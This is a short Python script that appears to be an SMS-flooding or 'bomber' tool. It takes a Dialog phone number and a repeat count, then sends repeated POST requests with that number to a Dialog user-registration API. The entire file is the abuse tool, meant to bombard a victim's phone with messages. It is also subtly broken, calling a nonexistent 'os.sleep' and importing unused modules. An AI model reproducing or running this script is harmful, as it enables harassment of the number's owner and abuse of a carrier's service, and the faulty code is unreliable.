from urllib import request
import os
from requests import post,get
num=input("Dialog number:")
F=int(input("count:"))
for i in range(F):
  url='https://megarun.dialog.lk/api/v2/user'
  body={'mobile':num[1:]}
  os.sleep(5)
  poreq=post(url,data=body)
